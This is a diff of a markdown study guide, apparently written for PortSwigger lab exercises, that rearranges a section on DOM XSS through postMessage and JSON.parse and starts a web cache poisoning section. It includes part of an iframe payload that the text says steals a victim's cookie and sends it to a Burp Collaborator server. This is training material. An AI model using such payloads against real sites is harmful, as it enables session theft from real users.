@@ -38,7 +38,11 @@
 
 >Target use web messaging and parses the message as JSON. Exploiting the vulnerability by constructing an HTML page on the exploit server that exploits DOM XSS vulnerability and steal victim cookie.  
 
+### DOM XSS Exploitation JSON.parse web messages  
+
 >The vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
+
+>Identify web messages on target that is using **postmessage()** with **DOM Invader**.  
 
 ```JavaScript
 <script>
@@ -70,9 +74,8 @@
 ```  
 
 >To exploit the above code, inject JavaScript into the JSON data to change "load-channel" field data and steal document cookie.  
-
   
->Hosted **iframe** on exploit server html body, to send the victim cookie to the collaboration server.  
+>Host an **iframe** on the exploit server html body, and send it to the victim, resulting in the stealing of their cookie. The victim cookie is sned to the Burp collaboration server.  
 
 ```html
 <iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
@@ -83,10 +86,6 @@
 ```  
 
 [PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)  
-
-### DOM XSS Exploitation JSON.parse web messages  
-
->Identify web messages on target that is using **postmessage()** with **DOM Invader**.  
 
 ![DOM Invader identify web messages](images/dom-invader-identify-web-messages.png)  
 
@@ -102,11 +101,10 @@
 ![DOM Invader resend web messages](images/dom-invader-resend-web-messages.png)  
   
 [PortSwigger: Identify DOM XSS using PortSwigger DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
-
-
+  
 ## Web Cache Poison  
 
->Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.
+>Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.  
 
 ```html
 GET / HTTP/1.1
